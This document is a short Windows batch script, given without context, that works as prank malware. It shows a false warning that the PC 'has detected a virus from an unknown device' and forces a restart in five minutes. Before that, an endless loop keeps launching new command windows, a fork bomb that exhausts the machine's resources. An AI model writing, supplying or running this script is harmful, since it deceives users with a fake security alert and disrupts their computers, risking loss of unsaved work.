@echo off
shutdown /c "This PC has detected a virus from an unknown device and has been set to shutdown in 5 minutes." /r /t 300
:loop
start
goto loop